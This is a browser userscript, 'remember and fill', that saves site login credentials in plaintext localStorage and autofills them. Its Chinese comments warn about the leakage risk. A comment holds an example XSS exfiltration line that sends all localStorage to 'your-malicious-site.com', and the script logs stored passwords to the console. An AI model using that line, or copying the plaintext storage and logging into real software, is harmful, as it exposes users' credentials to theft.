// ==UserScript==
// @name         remember and fill
// @namespace    http://tampermonkey.net/
// @version      1.9.5
// @description  记住网站的账号密码
// @author       You
// @match        *://*/*login*
// @match        https://*/register*
// @match        https://www.sanxijichang.com/*
// @run-at       document-start
// @icon         https://www.baidu.com/favicon.ico
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/445009/remember%20and%20fill.user.js
// @updateURL https://update.greasyfork.org/scripts/445009/remember%20and%20fill.meta.js
// ==/UserScript==
/**
 * 1、本脚本使用localStorage来记住网站的账号密码
 * 2、该脚本有泄露账号密码风险，包括本地数据泄露和远程数据泄露
 * 3、本地数据泄露：
 * 4、账号密码均为明文存储，物理设备丢失后有泄露风险。打开已记住的网站后
 *        可在更多工具-开发者工具-应用-存储-本地存储空间-域名查看记住的账号密码
 * 5、登出账号和关闭浏览器不会删除localStorage
 * 6、如需删除记住的账号密码，选择清除数据-网页存储
 * 7、如果填充失败可刷新页面让脚本再次填充，手动输入则会覆盖已记住数据
 * @returns
 */
const via = {
    // true改为false默认记住不询问
    isAsk: false, // 轮询计数器最大值（最多循环查询50次耗时略大于5s）
    counterMax: 50, // 版本（1.0版本更简单，适用网站更广）
    version: 2.0, // 超时时间检查（登录网页适配失败后半秒后再检查一遍）
    timeoutCheck: 250,
    timeoutCheckTimes: 10,
    /**
     * 移除网站记住的数据
     */
    remove: function () {
        localStorage.removeItem('via_isConfirm');
        localStorage.removeItem('via_username');
        localStorage.removeItem('via_password');
        localStorage.removeItem('via_email');
    }, /**
     * 远程数据泄露：
     * 如果一个网站存在XSS漏洞，那么攻击者注入如下代码
     * 就可以获取使用localStorage存储在本地数据
     */
    print: function () {
        var i = 0;
        var array = [];
        while (localStorage.key(i) != null) {
            var key = localStorage.key(i);
            array[key] = localStorage.getItem(key);
            i++;
        }
        //console.table(array);
        console.log(array);
        //document.location="http://your-malicious-site.com?stolen="+ array;
    }
};
(function () {
    //  声明定时器
    var timer = null;

    whenReady(function () {
        if (via.version == 2.0) {
            return recursiveQuery2();
        } else {
            return recursiveQuery();
        }
    });

    /**
     * 判断document是否加载完成
     */
    function whenReady(func) {
        console.time("轮询耗时");
        /**
         * document.readyState属性描述了文档的加载状态。一个文档的readyState可以是以下之一：
         * loading——加载，此时document仍在加载
         * interactive——互动，此时文档已经完成加载，文档已被解析，但是诸如图像，样式表和框架之类的子资源仍在加载。
         * complete——完成，此时T文档和所有子资源已完成加载。状态表示 load 事件即将被触发。
         */
        if (document.readyState === "interactive" || document.readyState === "complete") {
            func();
        } else {
            /**
             * DOMContentLoaded：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发。
             * 无需等待样式表、图像和子框架的完成加载。——interactive
             */
            document.addEventListener("DOMContentLoaded", func);
        }
    }

    /**
     * 递归查询密码框
     */
    function recursiveQuery() {
        var index = null;
        var allInput = document.getElementsByTagName("input");
        var allShownInput = [];
        for (var i = 0; i < allInput.length; i++) {
            /**
             * background作用域为div边框包括padding往里
             * 不包含margin，margin不为0时background大小将小于div的height*width）
             * input输入框位于padding里面（不包括padding）
             * offsetWidth 属性是一个只读属性，它返回该元素的像素宽度，
             * 宽度包含内边距（padding）和边框（border），不包含外边距（margin），是一个整数，单位是像素 px。
             * offsetWidth 数值由实际计算得出，如果该输入框被隐藏了则offsetWidth为0px。
             */
            if (allInput[i].offsetWidth > 0) {
                allShownInput.push(allInput[i]);
                if (allInput[i].type == "password") {
                    index = allShownInput.length - 1;
                    console.log("密码框：document.querySelectorAll('input')[" + i + "]");
                    console.log(allInput[i]);
                }
            }
        }
        if (!index) {
            if (via.counterMax > 0) {
                --via.counterMax;
                timer = setTimeout(recursiveQuery, 100);
            } else {
                console.timeEnd("轮询耗时");
            }
        } else {
            ask(allShownInput, index);
        }
    }

    function recursiveQuery2() {
        let index;
        const allInput = document.getElementsByTagName("input");
        let allShownInput = [];
        for (let i = 0; i < allInput.length; i++) {
            if (allInput[i].offsetWidth > 0) {
                allShownInput.push(allInput[i]);
                if (allInput[i].type === "password") {
                    if (!index) index = allShownInput.length - 1;
                    console.log("密码框：document.querySelectorAll('input')[" + i + "]");
                    console.log(allInput[i]);
                }
            }
        }
        if (allShownInput === []) {
            if (via.counterMax > 0) {
                --via.counterMax;
                timer = setTimeout(recursiveQuery2, 100);
            } else {
                console.timeEnd("轮询耗时");
            }
        } else {
            console.timeEnd("轮询耗时");
            if (index) {
                ask(allShownInput, index);
            } else {
                console.time("延时耗时");
                setTimeout(function () {
                    isShowPass(0);
                }, via.timeoutCheck);
            }
        }
    }

    /**
     * 半秒后是否显示密码框
     */
    function isShowPass(times) {
        let index;
        const allInput = document.getElementsByTagName("input");
        const allShownInput = [];
        for (let i = 0; i < allInput.length; i++) {
            if (allInput[i].offsetWidth > 0) {
                allShownInput.push(allInput[i]);
                if (!index && allInput[i].type === "password") {
                    index = allShownInput.length - 1;
                    console.log("密码框：document.querySelectorAll('input')[" + i + "]");
                    console.log(allInput[i]);
                }
            }
        }
        if (index) {
            console.timeEnd("延时耗时");
            ask(allShownInput, index);
        } else {
            if (++times <= via.timeoutCheckTimes) {
                setTimeout(() => isShowPass(times), via.timeoutCheck);
            } else {
                console.timeEnd("延时耗时");
            }
        }
    }

    /**
     * 询问
     */
    function ask(allShownInput, index) {
        //  清除定时器
        if (!timer) {
            clearTimeout(timer);
        }
        // 包含两个以上输入框
        if (index > 0) {
            // 询问则确认是否记住密码
            if (via.isAsk) {
                if (!localStorage.via_isConfirm) {
                    // 一个网站只询问一次
                    if (localStorage.via_isConfirm === '') {
                        return;
                    }
                    if (!confirm("记住本站密码吗？")) {
                        localStorage.setItem("via_isConfirm", "");
                        return;
                    } else {
                        localStorage.setItem("via_isConfirm", true);
                    }
                }
            }
            rememberFill(allShownInput, index);
        }
    }

    /**
     * 记住密码并填充
     * @param allShownInput 所有可使输入框
     * @param index 密码框索引
     */
    function rememberFill(allShownInput, index) {
        // 密码前一个为用户名
        const username = allShownInput[index - 1];
        const password = allShownInput[index];

        // 填充账号密码
        let isFill;
        if (localStorage.via_username) {
//    		username.value = localStorage.via_username;
            // 找不到 email、name、username 根据密码框位置填充
            allShownInput.forEach(input => {
                if (input.name === 'email' || input.id === 'email'
                    || input.name === 'name' || input.id === 'name'
                    || input.name === 'username' || input.id === 'username') {
                    keyboardInput(input, localStorage.via_username);

                    isFill = true;
                    const select = input.parentElement.querySelector('select');
                    if (select) {
                        keyboardInput(select, localStorage.via_username + localStorage.via_email);

                        const selectElement = select
                        for (let i = 0; i < selectElement.options.length; i++) {
                            if (selectElement.options[i].text === localStorage.via_email) {
                                setTimeout(
                                    () => select.parentElement.querySelector('select').selectedIndex = i,
                                    100)
                                break;
                            }
                        }
                    } else {
                        // 没有select框，并且保存有邮箱
                        if (localStorage.via_email) {
                            keyboardInput(input, localStorage.via_username + localStorage.via_email);
                        }
                    }
                }
            })
            if (!isFill) {
                // 如果密码前一个不是用户名，则再往上找input
                if (username.type === 'password') {
                    if (localStorage.via_password) {
                        keyboardInput(username, localStorage.via_password);
                    }
                   keyboardInput(allShownInput[index - 2], localStorage.via_username);
                } else {
                    keyboardInput(username, localStorage.via_username);
                }
                // 没有select框，并且保存有邮箱
                if (localStorage.via_email) {
                    keyboardInput(username, localStorage.via_username + localStorage.via_email);
                }
            }
        }
        if (localStorage.via_password) {
//    		password.value = localStorage.via_password;
            allShownInput.filter(input => input.type === 'password').forEach(input => {
                keyboardInput(input, localStorage.via_password);
            })
        }

        // 监听input输入保存到localStorage
        isFill = false
        allShownInput.forEach(input => {
            if (input.name === 'email' || input.id === 'email'
                || input.name === 'name' || input.id === 'name'
                || input.name === 'username' || input.id === 'username'
                || input.placeholder.match(/邮箱$|email|名|name|user/)) {
                input.addEventListener("input", function () {
                    localStorage.setItem("via_username", input.value);
                });
                let select = input.parentElement.querySelector('select');
                    setTimeout(
                        () => {
                            select = input.parentElement.querySelector('select');
                            console.warn(select)
                            if (select) {
                                if (select.text) {
                                    localStorage.setItem("via_email", select.text);
                                } else {
                                    localStorage.setItem("via_email", input.parentElement.querySelector('select').options[0].text);
                                }
                                select.addEventListener("change", function () {
                                    localStorage.setItem("via_email", this.selectedOptions[0].text);
                                });
                            }
                        },
                        1100)
                isFill = true
            }
        })
        if (!isFill) {
            username.addEventListener("input", function () {
                if (username.type === 'password') {
                    localStorage.setItem("via_username", allShownInput[index - 2].value);
                } else {
                    localStorage.setItem("via_username", username.value);
                }
            });
        }

        password.addEventListener("input", function () {
            localStorage.setItem("via_password", password.value);
        });

        via.print();
    }

    /**
     * 键盘输入
     * 作用: 有些时候会遇到使用 document.getElementById().value="xxx"; 的时候,
     *            页面的输入框中显示有值,但提交按钮显示用户还未输入..这就需要下面函数了
     */
    function keyboardInput(dom, st) {
        // 输入事件
        const evt = new InputEvent('input', {
            inputType: 'insertText', data: st, dataTransfer: null, isComposing: false
        });
        // 赋值
        dom.value = st;
        // 调度事件
        dom.dispatchEvent(evt);
    }

})();
